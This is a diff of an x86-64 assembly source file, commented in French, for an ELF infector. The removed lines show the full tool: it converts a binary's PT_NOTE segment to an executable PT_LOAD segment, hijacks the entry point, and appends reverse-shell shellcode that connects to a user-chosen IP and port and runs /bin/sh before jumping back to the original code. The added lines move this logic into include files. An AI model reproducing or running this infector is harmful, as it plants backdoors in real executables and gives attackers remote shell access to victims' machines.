@@ -1,249 +1,55 @@
 default abs
 
-section .data
-    msg_error db "Erreur lors du programme !!!!!!!!!!!", 0xa
-    msg_error_len equ $ - msg_error
-
-    msg_ip db "[x] - Veuillez définir l'ip sur laquel le reverse shell pointera : ", 0xa, "[x] -> "
-    msg_ip_len equ $ - msg_ip
-
-    msg_port db "[x] - Veuillez définir le port (entier) : ", 0xa, "[x] -> "
-    msg_port_len equ $ - msg_port
-
-    msg_lancement db "[x] - Lancement du programme ....", 0xa
-    msg_lancement_len equ $ - msg_lancement
-
-    msg_fin db "[x] - Fin du programme .... ",0xa, "[x] - Infection reussi ", 0xa
-    msg_fin_len equ $ - msg_fin
-
-
-    tp_load db 0x01
-    droit_write_exe db 0x05
-    exagereted dq 0xc000000
-    p_align dq 0x1000
-    taille_exagereted dq 0x1000
-
-
-
-    ; reverse_shell_1 s'arrête juste après "sin_family=2" (0x02, 0x00).
-    ; Les 2 octets suivants (port en big endian) sont écrits dynamiquement via port_result,
-    ; puis l'IP (4 octets) via ip_result, puis reverse_shell_2 commence par push rcx.
-    reverse_shell_1 db 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0xC7, 0xC0, 0x29, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC7, 0x02, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x06, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x50, 0x48, 0xB9, 0x02, 0x00
-    reverse_shell_1_len equ $ - reverse_shell_1
-    reverse_shell_2 db 0x51, 0x48, 0x89, 0xE6, 0x48, 0xC7, 0xC7, 0x03, 0x00, 0x00, 0x00, 0x6A, 0x10, 0x5A, 0x6A, 0x2A, 0x58, 0x0F, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x54, 0x58, 0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00, 0x5F, 0x57, 0x48, 0xC7, 0xC6, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00, 0x5F, 0x57, 0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00, 0x5F, 0x57, 0x48, 0xC7, 0xC6, 0x02, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53, 0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x89, 0xE7, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x0F, 0x05, 0x58, 0x58, 0x48, 0x31, 0xC0, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58
-    reverse_shell_2_len equ $ - reverse_shell_2
-    
-
-    
-    jump_insctruction db 0x48, 0xb8
-    jump db 0x00,0x00,0x00,0x00, 0xff, 0xe0
-    jump_len  equ $ - jump
-
-
-section .bss
-    buffer resb 2000      ; Buffer pour stocker les données lues
-    file_name resq 40
-    size_file_name resq 1
-
-    file_descriptor resq 1
-
-    offset_tp resq 1
-
-    file_stat resq 10
-
-    file_size resq 1
-
-    new_vaddr resq 1
-    new_paddr resq 1
-
-    old_entry_point resb 4
-    jmp_entry_point resb 4
-
-    ip_arg resq 4
-
-    ip_result resq 1
-
-    port_arg resq 1   ; buffer pour la saisie du port (8 octets max)
-    port_result resq 1 ; on utilise les 2 premiers octets (big endian)
-
+%include "main/inc/data.inc"
 
 section .text
 global _start
 
 _start:
-
-
     pop rax
-    cmp rax, 2 ;; argc doit valoir exactement 2 (binaire + fichier cible)
+    cmp rax, 2
     jne error
 
-    ; on retire le nom du fichier executable
     pop rsi
-
-    ; recuperation de l'argument 1
     pop rax
     mov [file_name], rax
-
-    xor rax,rax
-
-
-;========= demander l'ip =========
-
-; Afficher le message "Enter IP: "
-    mov rax, 1                   
-    mov rdi, 1                   
-    mov rsi, msg_ip                 
-    mov rdx, msg_ip_len                  
-    syscall
-
- 
-    ; Lecture de l'IP caractère par caractère jusqu'au '\n' ou max 16 bytes.
-    ; Évite d'aspirer d'un coup toute la saisie suivante (port) via un pipe.
-    xor r8, r8                        ; index courant
-read_ip_byte:
-    cmp r8, 16
-    jge read_ip_end
-    mov rax, 0
-    mov rdi, 0                        ; stdin
-    lea rsi, [ip_arg + r8]
-    mov rdx, 1
-    syscall
-    test rax, rax                     ; 0 ou négatif => EOF/erreur
-    jle read_ip_end
-    mov al, byte [ip_arg + r8]
-    inc r8
-    cmp al, 0xa                       ; newline ?
-    jne read_ip_byte
-read_ip_end:
-
-;========== parsing ip ==========
-
-
-    mov rsi, 0                  ; Index
-    mov rdi, ip_result -4        
-    mov rcx, 4                  ; Nombre d'octets
-    mov rdx, 0                  
-
-parse_loop:
-    cmp byte [ip_arg + rsi], 0xa ; Vérifier la fin de la chaîne
-    je store_last_octet
-
-    cmp byte [ip_arg + rsi], '.' ; Vérifier si c'est un point
-    je store_octet
-
-    ; Convertir le caractère ASCII en valeur numérique
-    movzx rax, byte [ip_arg + rsi]
-    sub rax, '0'
-    imul rdx, rdx, 10
-    add rdx, rax
-
-    inc rsi
-    jmp parse_loop
-
-store_octet:
-    mov [rdi + rcx], dl         ; Stocker l'octet courant
-    inc rcx                     ; Avance
-    xor rdx, rdx                ; reset
-    inc rsi                     ; Avance
-    jmp parse_loop
-store_last_octet:
-    mov [rdi + rcx], dl                ; Stocker le dernier octet
-
-fin_parsing:
-
-;========= demander le port =========
-    mov rax, 1
-    mov rdi, 1
-    mov rsi, msg_port
-    mov rdx, msg_port_len
-    syscall
-
-    ; Même technique pour le port : lecture octet par octet jusqu'au '\n'.
-    xor r8, r8
-read_port_byte:
-    cmp r8, 8
-    jge read_port_end
-    mov rax, 0
-    mov rdi, 0
-    lea rsi, [port_arg + r8]
-    mov rdx, 1
-    syscall
-    test rax, rax
-    jle read_port_end
-    mov al, byte [port_arg + r8]
-    inc r8
-    cmp al, 0xa
-    jne read_port_byte
-read_port_end:
-
-;========== parsing port ==========
-    xor rsi, rsi
     xor rax, rax
 
-parse_port_loop:
-    movzx rdx, byte [port_arg + rsi]
-    cmp rdx, 0xa                      ; newline = fin de saisie
-    je parse_port_done
-    test rdx, rdx                     ; null = fin aussi
-    je parse_port_done
-    sub rdx, '0'
-    imul rax, rax, 10
-    add rax, rdx
-    inc rsi
-    jmp parse_port_loop
+%include "main/inc/input.inc"
 
-parse_port_done:
-    xchg al, ah                       ; swap low/high byte -> big endian (network byte order)
-    mov [port_result], ax
+    xor rax, rax
 
-    xor rax,rax
-
-    ; Ouverture du fichier en lecture ecriture 
+    ; Open target file (read/write)
     mov rax, 2
     mov rdi, [file_name]
     mov rsi, 2
     syscall
 
-    ; verification des erreurs
-    test rax, rax 
+    test rax, rax
     js error
 
-    ; Sauvegarde du descripteur de fichier
     mov [file_descriptor], rax
 
-
-    ; Verification taille fichier
-    cmp rax, 0
-    jle error
-
-    ; Lecture du fichier
-    mov rax, 0          
+    ; Read ELF header into buffer
+    mov rax, 0
     mov rdi, [file_descriptor]
-    mov rsi, buffer     
-    mov rdx, 2000        
-    syscall            
+    mov rsi, buffer
+    mov rdx, 2000
+    syscall
 
+    mov rdi, 1
+    mov rax, 1
+    mov rsi, msg_start
+    mov rdx, msg_start_len
+    syscall
 
-; programme bien lancé
-    mov rdi, 1              ; file descriptor 1 is stdout
-    mov rax, 1              
-    mov rsi, msg_lancement       ; affichage du fic debug  
-    mov rdx, msg_lancement_len
-    syscall 
-
-
-
-    ;init
     xor r15, r15
     xor r9, r9
     mov r9, buffer
     xor rcx, rcx
 
-
-;========= taille du fichier =========
-
-    ;taille du fichier
-    mov rax,8
+    ; Get file size via lseek
+    mov rax, 8
     mov rdi, [file_descriptor]
     mov rsi, 0
     mov rdx, 1
@@ -251,260 +57,38 @@ parse_port_done:
 
     mov rbx, rax
 
-    mov rax,8
-    mov rdi,[file_descriptor]
-    mov rsi, 0
-    mov rdx, 2
-    syscall
-
-    mov [file_size], rax ;save
-
-    ;reset du curseur
     mov rax, 8
     mov rdi, [file_descriptor]
-    mov rsi,0
-    mov rdx,0
+    mov rsi, 0
+    mov rdx, 2
     syscall
 
-;========= Trouver segment NOTE  ========= 
+    mov [file_size], rax
 
-mov r15, buffer
-
-    xor rcx, rcx
-    xor rdx, rdx
-    movzx rcx, word [buffer + 0x38]   ; e_phnum lu dynamiquement dans le header ELF
-    mov rbx, 64    ; file header
-    mov dx,  56 ; tailles des segments
-
-    loop_seg:
-        add rbx, rdx                  
-        dec rcx                        
-        xor r13, r13      
-        mov r13d , dword [r15 +rbx] 
-        cmp dword [r15 +rbx], 0x4  ; valeur du PT_NOTE
-        je pt_note_ok
-        cmp rcx, 0
-        jg loop_seg
-
-
-        jmp error 
-
-    pt_note_ok:
-
-    mov [offset_tp], rbx ; Offset du PT_NOTE !!!! 
-    
-    xor rcx,rcx
-    xor rax, rax
-
-    mov rax, [exagereted]
-    add rax, [file_size]
-    mov [new_vaddr], rax
-
-
-    modification_file:
-    xor rax,rax
-    mov rdi, [file_descriptor] ; meme premier arg pour toutes les autres fonctions , economise 20 lignes
-
-;=============== Get old entry point =================
-    mov rax, 8          ; lseek curseur
-    mov rsi, 0x18     ; offset jusqu'au entry point
-    mov rdx, 0          
-    syscall     
-
-    mov rax, 0          ; read 
-    mov rsi, old_entry_point  ; adresse où stocker l'ancien entry point
-    mov rdx, 8          ; taille de l'entrée à lire
-    syscall
-
-;=============== change entry point =================
-    mov rax, 8          ; lseek curseur
-    mov rsi, 0x18     ; offset jusqu'au entry point
-    mov rdx, 0          
-    syscall       
-
-    mov rax, 1         
-    mov rsi, new_vaddr   ; offset + valeur exagéré( c000000)
-    mov rdx, 8 
-    syscall 
-
-; =============== PT NOte to PT LOAD =================
-    mov rax, 8          
-    mov rsi, [offset_tp]     
-    mov rdx, 0          ; type 
-    syscall       
-
-    mov rax, 1         
-    mov rsi, tp_load 
-    mov rdx, 1 
-    syscall    
-
-; =============== Changement droit  =================
-    mov rax, 8          
-    mov rsi, [offset_tp]  
-    add rsi , 4    ; Droit 
-    mov rdx, 0         
-    syscall       
-
-    mov rax, 1         
-    mov rsi, droit_write_exe   
-    mov rdx, 1 
-    syscall             
-
-; =============== Address offset  =================
-    mov rax, 8          
-    mov rsi, [offset_tp]  
-    add rsi , 8   ; offset
-    mov rdx, 0          
-    syscall       
-
-    mov rax, 1         
-    mov rsi, file_size  
-    mov rdx, 3 
-    syscall         
-
-; =============== Virtual address  =================
-    mov rax, 8          
-    mov rsi, [offset_tp]  
-    add rsi , 16   ; vaddr
-    mov rdx, 0        
-    syscall       
-
-    mov rax, 1         
-    mov rsi, new_vaddr
-    mov rdx, 4 
-    syscall       
-
-; =============== Taille to exe  filesiz =================
-    mov rax, 8         
-    mov rsi, [offset_tp]  
-    add rsi , 32   ; taille a lire file
+    ; Reset cursor
+    mov rax, 8
+    mov rdi, [file_descriptor]
+    mov rsi, 0
     mov rdx, 0
-    syscall       
-
-    mov rax, 1         
-    mov rsi, taille_exagereted  
-    mov rdx, 3 
-    syscall          
-
-; =============== Taille to exe memsiz =================
-    mov rax, 8         
-    mov rsi, [offset_tp]  
-    add rsi , 40  ; taille a lire mem
-    mov rdx, 0          
-    syscall       
-
-    mov rax, 1         
-    mov rsi, taille_exagereted   
-    mov rdx, 3 
-    syscall         
-
-; =============== p align =================
-    mov rax, 8        
-    mov rsi, [offset_tp]  
-    add rsi , 48  ; alignement
-    mov rdx, 0         
-    syscall       
-
-    mov rax, 1
-    mov rsi, p_align
-    mov rdx, 8         ; p_align est un uint64_t
     syscall
 
-; =============== Ajout shell code  part 1 =================
-    mov rax, 8
-    mov rsi, 0
-    mov rdx, 2        ; fin du fichier
-    syscall
+%include "main/inc/elf_patcher.inc"
 
-    mov rax, 1
-    mov rsi, reverse_shell_1
-    mov rdx, reverse_shell_1_len
-    syscall
-
-    ; =============== Ajout port (2 octets, big endian) =================
-    mov rax, 8
-    mov rsi, 0
-    mov rdx, 2        ; fin du fichier
-    syscall
-
-    mov rax, 1
-    mov rsi, port_result
-    mov rdx, 2
-    syscall
-
-    ; =============== Ajout IP shell code =================
-    mov rax, 8
-    mov rsi, 0
-    mov rdx, 2        ; fin du fichier
-    syscall
-
-    mov rax, 1
-    mov rsi, ip_result
-    mov rdx, 4
-    syscall
-
-; =============== Ajout shell code  part 2 =================
-    mov rax, 8          
-    mov rsi, 0 
-    mov rdx, 2        ; fin du fichier 
-    syscall  
-
-    mov rax, 1         
-    mov rsi, reverse_shell_2  
-    mov rdx, reverse_shell_2_len
-    syscall      
-
-;=============================================================
-; =============== Ajout instruction de saut  =================
-    mov rax, 8          
-    mov rsi, 0 
-    mov rdx, 2        ; fin du fichier 
-    syscall  
-
-    mov rax, 1         
-    mov rsi, jump_insctruction  
-    mov rdx, 2
-    syscall    
-
-; =============== Ajout offset a sauter  =================
-    mov rax, 8          
-    mov rsi, 0 
-    mov rdx, 2        ; fin du fichier 
-    syscall  
-
-    mov rax, 1    
-    mov rsi, old_entry_point
-    mov rdx, 4     
-    syscall
-      
-; =============== jump  =================
-    mov rax, 8          
-    mov rsi, 0 
-    mov rdx, 2        ; fin du fichier 
-    syscall  
-
-    mov rax, 1         
-    mov rsi, jump
-    mov rdx, jump_len
-    syscall
-      
+%include "main/inc/injector.inc"
 
 sortie:
-    ;fermeture fichier
-    mov rax, 3          
-    syscall  
+    mov rax, 3
+    syscall
 
-    ;message de fin
-    mov rdi, 1             
-    mov rax, 1              
-    mov rsi, msg_fin      
-    mov rdx, msg_fin_len
-    syscall 
+    mov rdi, 1
+    mov rax, 1
+    mov rsi, msg_done
+    mov rdx, msg_done_len
+    syscall
 
-    ; Code de sortie
-    mov rax, 60    
-    mov rdi, 0    
-    syscall     
+    mov rax, 60
+    mov rdi, 0
+    syscall
 
 error:
     mov rax, 1
@@ -516,4 +100,3 @@ error:
     mov rax, 60
     mov rdi, 1
     syscall
-
